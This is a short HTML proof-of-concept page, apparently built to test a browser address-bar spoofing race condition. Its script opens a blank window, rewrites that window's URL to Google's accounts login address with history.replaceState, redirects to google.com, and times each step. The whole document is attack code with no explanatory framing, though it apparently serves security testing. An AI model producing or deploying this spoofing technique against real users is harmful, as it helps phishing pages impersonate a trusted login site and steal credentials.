<html>
<head>
    <title>Race Condition Test</title>
</head>
<body>
    <button onclick="testRaceCondition()">Test Race Condition</button>

    <script>
        function testRaceCondition() {
            const w = window.open('', '_blank');
            
            // Timing critical section
            const startTime = Date.now();
            
            w.document.write(`
                <html>
                <body>
                    <h1>Testing Timing</h1>
                    <p id="timing"></p>
                    <script>
                        const start = Date.now();
                        
                        // Try spoof ASAP
                        history.replaceState({}, 'Google', 'https://accounts.google.com');
                        const afterSpoof = Date.now();
                        
                        // Try redirect
                        setTimeout(() => {
                            const beforeRedirect = Date.now();
                            window.location.href = 'https://google.com';
                            
                            document.getElementById('timing').innerHTML = 
                                'Spoof: ' + (afterSpoof - start) + 'ms<br>' +
                                'Redirect: ' + (beforeRedirect - start) + 'ms';
                        }, 10);
                    <\/script>
                </body>
                </html>
            `);
        }
    </script>
</body>
</html>
